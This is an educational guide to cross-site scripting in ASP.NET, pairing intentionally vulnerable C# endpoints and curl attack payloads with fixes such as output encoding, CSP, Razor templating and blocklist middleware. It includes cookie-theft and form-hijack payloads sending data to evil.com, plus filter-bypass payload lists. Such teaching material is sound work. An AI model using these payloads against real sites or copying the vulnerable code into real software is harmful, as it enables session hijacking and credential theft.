# Cross-Site Scripting (XSS) - Deep Dive

## What is XSS?

Cross-Site Scripting (XSS) is a vulnerability where malicious scripts are injected into web applications and executed in users' browsers. This allows attackers to steal cookies, session tokens, redirect users, or perform actions on behalf of victims.

## Root Cause Analysis

### Understanding XSS Context

XSS occurs when user input is included in web responses without proper encoding or validation. The vulnerability exists in different contexts:

1. **HTML Context**: User data inserted directly into HTML
2. **JavaScript Context**: User data inserted into JavaScript code
3. **Attribute Context**: User data inserted into HTML attributes
4. **URL Context**: User data inserted into URLs

### Vulnerable Code Patterns

#### 1. Reflected XSS in HTML Response

```csharp
[HttpGet("search")]
public IActionResult Search(string query)
{
    if (string.IsNullOrEmpty(query))
    {
        return BadRequest("Query parameter is required");
    }

    // VULNERABLE: Reflecting user input without encoding
    var htmlResponse = $@"
        <html>
        <head><title>Search Results</title></head>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
            <div id='results'>
                <p>No results found for '{query}'</p>
            </div>
            <script>
                console.log('Search query: {query}');
            </script>
        </body>
        </html>";

    return Content(htmlResponse, "text/html");
}
```

**Why This is Vulnerable:**
- `{query}` is directly inserted into HTML without encoding
- Appears in multiple contexts: HTML content, HTML attribute, and JavaScript
- No validation or sanitization of user input

#### 2. XSS in JSON Response

```csharp
[HttpGet("profile")]
public IActionResult GetProfile(string username, string bio)
{
    return Ok(new
    {
        success = true,
        profile = new
        {
            username = username,
            bio = bio ?? "No bio available",
            // VULNERABLE: HTML content without encoding
            welcomeMessage = $"<h2>Welcome back, {username}!</h2>",
            profileHtml = $@"
                <div class='profile-card'>
                    <h3>{username}</h3>
                    <p>{bio}</p>
                    <script>console.log('User: {username}');</script>
                </div>"
        }
    });
}
```

**Why This is Vulnerable:**
- JSON response contains HTML that will be rendered client-side
- Username appears in HTML context without encoding
- Client-side rendering makes this exploitable

#### 3. DOM-based XSS Setup

```csharp
[HttpGet("dashboard")]
public IActionResult Dashboard(string theme = "light")
{
    var htmlResponse = $@"
        <script>
            // VULNERABLE: DOM manipulation with user input
            var urlParams = new URLSearchParams(window.location.search);
            var welcomeMsg = urlParams.get('welcome') || 'Welcome to your dashboard!';
            document.getElementById('welcome').innerHTML = welcomeMsg;
            
            // VULNERABLE: Theme parameter reflected in JavaScript
            var currentTheme = '{theme}';
            console.log('Theme loaded: ' + currentTheme);
        </script>";

    return Content(htmlResponse, "text/html");
}
```

**Why This is Vulnerable:**
- JavaScript code uses `innerHTML` with unsanitized URL parameters
- Server-side theme parameter is reflected into JavaScript context
- Creates client-side XSS opportunity

## How XSS Attacks Work

### Attack Vectors and Payloads

#### 1. Basic Script Injection
```bash
# HTML context injection
curl "http://localhost:5000/api/xss/search?query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
# URL decoded: <script>alert('XSS')</script>
```

**Attack Flow:**
1. Malicious payload sent in query parameter
2. Server reflects payload directly into HTML response
3. Browser executes the script when rendering the page
4. Alert dialog appears, confirming XSS execution

#### 2. Image Tag with onerror Event
```bash
# Image onerror injection
curl "http://localhost:5000/api/xss/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E"
# URL decoded: <img src=x onerror=alert('XSS')>
```

**Why This Works:**
- `<img src=x>` creates invalid image that fails to load
- `onerror` event handler executes when image fails
- Works even when `<script>` tags are filtered

#### 3. JavaScript Context Injection
```bash
# Break out of JavaScript string context
curl "http://localhost:5000/api/xss/search?query=test%27%3Balert%28%27XSS%27%29%3B%2F%2F"
# URL decoded: test';alert('XSS');//
```

**Resulting JavaScript:**
```javascript
console.log('Search query: test');alert('XSS');//');
```

**Attack Flow:**
1. `test'` closes the original string
2. `;alert('XSS');` executes malicious JavaScript
3. `//` comments out the rest of the line

#### 4. Cookie Theft Attack
```bash
# Steal session cookies
curl "http://localhost:5000/api/xss/search?query=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E"
```

**URL decoded payload:**
```html
<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
```

**Attack Impact:**
- Sends user's cookies to attacker's server
- Allows session hijacking
- Compromises user account

#### 5. Form Hijacking
```bash
# Modify forms to steal credentials
curl "http://localhost:5000/api/xss/search?query=%3Cscript%3Edocument.forms%5B0%5D.action%3D%27http%3A%2F%2Fevil.com%2Fsteal%27%3C%2Fscript%3E"
```

**URL decoded:**
```html
<script>document.forms[0].action='http://evil.com/steal'</script>
```

**Attack Impact:**
- Redirects form submissions to attacker's server
- Steals login credentials
- Captures sensitive form data

#### 6. JSON Response Exploitation
```bash
# XSS in profile endpoint
curl "http://localhost:5000/api/xss/profile?username=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&bio=test"
```

**Resulting JSON:**
```json
{
  "welcomeMessage": "<h2>Welcome back, <script>alert(document.cookie)</script>!</h2>",
  "profileHtml": "<div class='profile-card'><h3><script>alert(document.cookie)</script></h3>..."
}
```

**Client-side Exploitation:**
```javascript
// When client renders the HTML:
document.getElementById('profile').innerHTML = response.profile.profileHtml;
// Script executes and shows cookies
```

### Advanced Attack Techniques

#### 1. Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Alternative tags -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- Encoding -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Event handlers -->
<div onclick="alert('XSS')">Click me</div>
<input onfocus="alert('XSS')" autofocus>
```

#### 2. Context-Specific Payloads
```html
<!-- HTML context -->
<script>alert('XSS')</script>

<!-- Attribute context -->
" onmouseover="alert('XSS')"

<!-- JavaScript string context -->
'; alert('XSS'); //

<!-- CSS context -->
</style><script>alert('XSS')</script>
```

## Impact Analysis

### Immediate Impact
- **Session Hijacking**: Steal authentication cookies
- **Credential Theft**: Capture login credentials
- **Data Exfiltration**: Access sensitive page content
- **Malware Distribution**: Redirect to malicious sites

### Business Impact
- **Account Compromise**: User accounts taken over
- **Data Breaches**: Sensitive information stolen
- **Reputation Damage**: Trust lost due to security incidents
- **Compliance Violations**: Regulatory penalties

### Real-World Attack Scenarios

#### Scenario 1: Social Media Platform
1. Attacker posts content with XSS payload
2. Other users view the post
3. XSS executes in victims' browsers
4. Attacker steals session cookies of all viewers
5. Mass account compromise occurs

#### Scenario 2: E-commerce Site
1. XSS payload in product review
2. Admin views reviews in admin panel
3. XSS executes with admin privileges
4. Attacker gains administrative access
5. Customer data and payment information compromised

## Fix Implementation

### 1. Output Encoding

```csharp
using System.Web;
using Microsoft.AspNetCore.Html;

[HttpGet("search-secure")]
public IActionResult SearchSecure(string query)
{
    if (string.IsNullOrEmpty(query))
        return BadRequest("Query parameter is required");

    // HTML encode user input for HTML context
    var encodedQuery = HttpUtility.HtmlEncode(query);
    
    // JavaScript encode for JavaScript context
    var jsEncodedQuery = HttpUtility.JavaScriptStringEncode(query);
    
    var htmlResponse = $@"
        <html>
        <head><title>Search Results</title></head>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {encodedQuery}</p>
            <div id='results'>
                <p>No results found for '{encodedQuery}'</p>
            </div>
            <script>
                console.log('Search query: ""{jsEncodedQuery}""');
            </script>
        </body>
        </html>";

    return Content(htmlResponse, "text/html");
}
```

### 2. Content Security Policy (CSP)

```csharp
[HttpGet("dashboard-secure")]
public IActionResult DashboardSecure(string theme = "light")
{
    // Validate and sanitize theme parameter
    var allowedThemes = new[] { "light", "dark", "auto" };
    if (!allowedThemes.Contains(theme))
        theme = "light";

    // Set strict CSP header
    Response.Headers.Add("Content-Security-Policy", 
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data:; " +
        "connect-src 'self'");
    
    var htmlResponse = $@"
        <html>
        <head>
            <title>Secure Dashboard</title>
            <style>
                .{theme} {{ background: {(theme == "dark" ? "#333" : "#fff")}; }}
            </style>
        </head>
        <body class='{theme}'>
            <h1>Dashboard</h1>
            <div id='content'>
                <p>Welcome to your secure dashboard</p>
            </div>
            <script>
                // SECURE: No user input in JavaScript
                var validThemes = ['light', 'dark', 'auto'];
                var currentTheme = '{HttpUtility.JavaScriptStringEncode(theme)}';
                
                if (validThemes.includes(currentTheme)) {
                    console.log('Valid theme loaded: ' + currentTheme);
                } else {
                    console.log('Invalid theme, using default');
                }
            </script>
        </body>
        </html>";

    return Content(htmlResponse, "text/html");
}
```

### 3. Safe JSON Responses

```csharp
public class SafeProfileResponse
{
    public string Username { get; set; } = string.Empty;
    public string Bio { get; set; } = string.Empty;
    public string Message { get; set; } = string.Empty;
    // No HTML content properties
}

[HttpGet("profile-secure")]
public IActionResult GetProfileSecure(string username, string bio)
{
    if (string.IsNullOrEmpty(username))
        return BadRequest("Username parameter is required");

    // Input validation
    if (username.Length > 50)
        return BadRequest("Username too long");
    
    if (!string.IsNullOrEmpty(bio) && bio.Length > 500)
        return BadRequest("Bio too long");

    // Return safe JSON without HTML content
    var response = new SafeProfileResponse
    {
        Username = username, // Will be JSON-encoded automatically
        Bio = bio ?? "No bio available",
        Message = "Profile data retrieved securely"
    };

    return Ok(new
    {
        success = true,
        profile = response,
        timestamp = DateTime.UtcNow,
        // Note: No HTML content that could be rendered unsafely
        renderingNote = "Use proper encoding when displaying this data client-side"
    });
}
```

### 4. Input Validation and Sanitization

```csharp
public class InputSanitizer
{
    private static readonly string[] ForbiddenTags = 
    {
        "<script", "</script>", "<iframe", "</iframe>", 
        "<object", "</object>", "<embed", "</embed>",
        "<form", "</form>", "javascript:", "vbscript:",
        "onload=", "onerror=", "onclick=", "onmouseover="
    };

    public static bool ContainsMaliciousContent(string input)
    {
        if (string.IsNullOrEmpty(input))
            return false;

        var lowerInput = input.ToLowerInvariant();
        return ForbiddenTags.Any(tag => lowerInput.Contains(tag));
    }

    public static string SanitizeInput(string input)
    {
        if (string.IsNullOrEmpty(input))
            return string.Empty;

        // Remove potentially dangerous content
        var sanitized = input;
        
        foreach (var tag in ForbiddenTags)
        {
            sanitized = sanitized.Replace(tag, string.Empty, StringComparison.OrdinalIgnoreCase);
        }

        return sanitized;
    }
}

[HttpPost("comment-secure")]
public IActionResult PostCommentSecure([FromBody] CommentRequest request)
{
    if (request == null || string.IsNullOrEmpty(request.Content))
        return BadRequest("Comment content is required");

    // Input validation
    if (request.Content.Length > 1000)
        return BadRequest("Comment too long (max 1000 characters)");

    // Check for malicious content
    if (InputSanitizer.ContainsMaliciousContent(request.Content) ||
        InputSanitizer.ContainsMaliciousContent(request.Author))
    {
        _logger.LogWarning("Malicious content detected in comment from IP {ClientIP}", 
            HttpContext.Connection.RemoteIpAddress);
        return BadRequest("Content contains prohibited elements");
    }

    // Store comment safely (would typically go to database)
    var comment = new
    {
        id = Guid.NewGuid(),
        author = request.Author ?? "Anonymous",
        content = request.Content,
        timestamp = DateTime.UtcNow,
        // No HTML rendering on server side
        securityNote = "Content must be properly encoded when displayed"
    };

    return Ok(new
    {
        success = true,
        comment = comment,
        message = "Comment posted securely"
    });
}
```

### 5. Template-Based Approach with Razor

```csharp
[HttpGet("search-razor")]
public IActionResult SearchWithRazor(string query)
{
    if (string.IsNullOrEmpty(query))
        return BadRequest("Query parameter is required");

    var model = new SearchViewModel
    {
        Query = query,
        Results = new List<string>(), // Empty for demo
        Message = $"No results found for your search"
    };

    return View("SearchResults", model);
}

public class SearchViewModel
{
    public string Query { get; set; } = string.Empty;
    public List<string> Results { get; set; } = new();
    public string Message { get; set; } = string.Empty;
}
```

**Corresponding Razor View (SearchResults.cshtml):**
```html
@model SearchViewModel
<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
</head>
<body>
    <h1>Search Results</h1>
    <!-- Razor automatically HTML encodes @Model.Query -->
    <p>You searched for: @Model.Query</p>
    
    <div id="results">
        @if (Model.Results.Any())
        {
            <ul>
                @foreach (var result in Model.Results)
                {
                    <!-- Each result is automatically encoded -->
                    <li>@result</li>
                }
            </ul>
        }
        else
        {
            <!-- Message is automatically encoded -->
            <p>@Model.Message</p>
        }
    </div>
    
    <script>
        // Safe way to pass data to JavaScript
        var searchData = @Html.Raw(Json.Serialize(new { 
            query = Model.Query,
            resultCount = Model.Results.Count
        }));
        console.log('Search performed:', searchData.query);
    </script>
</body>
</html>
```

### 6. Comprehensive Security Middleware

```csharp
public class XssProtectionMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<XssProtectionMiddleware> _logger;

    public XssProtectionMiddleware(RequestDelegate next, ILogger<XssProtectionMiddleware> logger)
    {
        _next = next;
        _logger = logger;
    }

    public async Task InvokeAsync(HttpContext context)
    {
        // Add security headers
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
        context.Response.Headers.Add("X-Frame-Options", "SAMEORIGIN");
        context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
        context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");

        // Check for XSS patterns in request
        if (ContainsXssPatterns(context.Request))
        {
            var clientIp = context.Connection.RemoteIpAddress?.ToString();
            _logger.LogWarning("Potential XSS attempt detected from IP {ClientIP} on path {Path}", 
                clientIp, context.Request.Path);

            context.Response.StatusCode = 400;
            await context.Response.WriteAsync("Request contains potentially malicious content");
            return;
        }

        await _next(context);
    }

    private bool ContainsXssPatterns(HttpRequest request)
    {
        var xssPatterns = new[]
        {
            "<script", "</script>", "javascript:", "vbscript:",
            "onload=", "onerror=", "onclick=", "onmouseover=",
            "<iframe", "<object", "<embed"
        };

        // Check query parameters
        foreach (var param in request.Query)
        {
            var value = param.Value.ToString().ToLowerInvariant();
            if (xssPatterns.Any(pattern => value.Contains(pattern)))
                return true;
        }

        // Check form data (if present)
        if (request.HasFormContentType)
        {
            foreach (var param in request.Form)
            {
                var value = param.Value.ToString().ToLowerInvariant();
                if (xssPatterns.Any(pattern => value.Contains(pattern)))
                    return true;
            }
        }

        return false;
    }
}

// Register middleware in Startup.cs
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    app.UseMiddleware<XssProtectionMiddleware>();
    // ... other middleware
}
```

## How the Fixes Work

### 1. Output Encoding
```csharp
var encodedQuery = HttpUtility.HtmlEncode(query);
```
- **Problem Solved**: Prevents HTML injection
- **How**: Converts `<script>` to `&lt;script&gt;`
- **Result**: Browser displays text instead of executing code

### 2. Context-Specific Encoding
```csharp
// HTML context
HttpUtility.HtmlEncode(userInput)

// JavaScript context  
HttpUtility.JavaScriptStringEncode(userInput)

// URL context
HttpUtility.UrlEncode(userInput)
```
- **Problem Solved**: Proper encoding for each context
- **How**: Uses appropriate encoding method for where data appears
- **Benefit**: Prevents context-specific bypass techniques

### 3. Content Security Policy (CSP)
```csharp
"script-src 'self'; style-src 'self' 'unsafe-inline'"
```
- **Problem Solved**: Blocks inline scripts and external resources
- **How**: Browser enforces policy and blocks unauthorized scripts
- **Benefit**: Defense in depth - works even if encoding fails

### 4. Input Validation
```csharp
if (InputSanitizer.ContainsMaliciousContent(request.Content))
    return BadRequest("Content contains prohibited elements");
```
- **Problem Solved**: Rejects obviously malicious input
- **How**: Scans for known XSS patterns and blocks them
- **Benefit**: Early detection and prevention

### 5. Safe JSON Responses
```csharp
// Instead of: { "html": "<h1>" + userInput + "</h1>" }
// Use: { "title": userInput, "message": "Safe data" }
```
- **Problem Solved**: Eliminates HTML injection points
- **How**: Returns structured data instead of HTML snippets
- **Benefit**: Client must explicitly choose to render unsafely

### 6. Template Engine Auto-Encoding
```html
<!-- Razor automatically encodes -->
<p>@Model.UserInput</p>

<!-- Equivalent to -->
<p>@Html.Encode(Model.UserInput)</p>
```
- **Problem Solved**: Automatic encoding by default
- **How**: Template engine handles encoding transparently
- **Benefit**: Developers can't forget to encode

## Advanced Protection Techniques

### 1. Subresource Integrity (SRI)
```html
<script src="https://cdn.example.com/library.js" 
        integrity="sha384-abc123..." 
        crossorigin="anonymous"></script>
```

### 2. Trusted Types (Modern Browsers)
```javascript
// Requires trusted types for innerHTML
const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => {
        // Sanitize input before creating HTML
        return sanitizeHtml(input);
    }
});

element.innerHTML = policy.createHTML(userInput);
```

### 3. Regular Security Testing
```csharp
public class XssTestSuite
{
    private readonly TestClient _client;

    [Test]
    public async Task SearchEndpoint_ShouldEncodeScriptTags()
    {
        var payload = "<script>alert('XSS')</script>";
        var response = await _client.GetAsync($"/api/xss/search-secure?query={Uri.EscapeDataString(payload)}");
        
        var content = await response.Content.ReadAsStringAsync();
        
        // Should not contain executable script
        Assert.DoesNotContain("<script>alert('XSS')</script>", content);
        // Should contain encoded version
        Assert.Contains("&lt;script&gt;alert('XSS')&lt;/script&gt;", content);
    }

    [Test]
    public async Task ProfileEndpoint_ShouldNotReturnHtmlContent()
    {
        var payload = "<img src=x onerror=alert('XSS')>";
        var response = await _client.GetAsync($"/api/xss/profile-secure?username={Uri.EscapeDataString(payload)}");
        
        var json = await response.Content.ReadAsStringAsync();
        var data = JsonSerializer.Deserialize<dynamic>(json);
        
        // Should not contain HTML properties
        Assert.DoesNotContain("profileHtml", json);
        // Username should be safely stored in JSON
        Assert.Equal(payload, data.profile.username);
    }
}
```

## Testing the Fix

### Positive Tests (Should Work)
```bash
# Normal input should work fine
curl "http://localhost:5000/api/xss/search-secure?query=normal+search+term"

# Special characters should be encoded
curl "http://localhost:5000/api/xss/search-secure?query=cats+%26+dogs"
```

### Security Tests (Should Be Safe)
```bash
# Script tags should be encoded, not executed
curl "http://localhost:5000/api/xss/search-secure?query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"

# Image onerror should be encoded
curl "http://localhost:5000/api/xss/search-secure?query=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E"

# JavaScript context injection should be prevented
curl "http://localhost:5000/api/xss/search-secure?query=test%27%3Balert%28%27XSS%27%29%3B%2F%2F"

# Malicious content should be rejected
curl -X POST "http://localhost:5000/api/xss/comment-secure" \
  -H "Content-Type: application/json" \
  -d '{"content": "<script>alert(\"XSS\")</script>", "author": "Attacker"}'
```

### CSP Tests
```bash
# Should include CSP headers
curl -I "http://localhost:5000/api/xss/dashboard-secure"
# Look for: Content-Security-Policy: default-src 'self'; script-src 'self'
```

The comprehensive XSS protection ensures that user input cannot be executed as code in any context, providing robust defense against all common XSS attack vectors through multiple layers of protection.
